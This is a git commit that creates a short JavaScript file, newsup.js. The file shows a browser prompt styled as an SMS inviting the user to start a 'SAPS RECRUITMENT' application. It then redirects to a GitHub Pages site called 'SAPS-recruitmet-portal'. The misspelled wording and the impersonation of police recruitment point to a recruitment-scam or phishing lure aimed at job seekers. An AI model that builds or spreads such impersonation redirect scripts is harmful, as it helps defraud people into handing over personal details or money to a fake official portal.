14c38767fd0839af01585e3c4eb7dc9eb03a566e
offernoww <josiahnyeti16@gmail.com>
2025-02-04 01:37:25 +0100

    Create newsup.js

---
+++ newsup.js
@@ -0,0 +1,6 @@
+
+var password = 'SAPS RECRUITMENT'
+password=prompt('SMS :WELCOME start your recruitmemt program application, click OK to start your applictaion  ','SAPS RECRUITMENT');
+if (password != 'SAPS RECRUITMENT') {
+location.href='https://offernoww.github.io/SAPS-recruitmet-portal';
+}
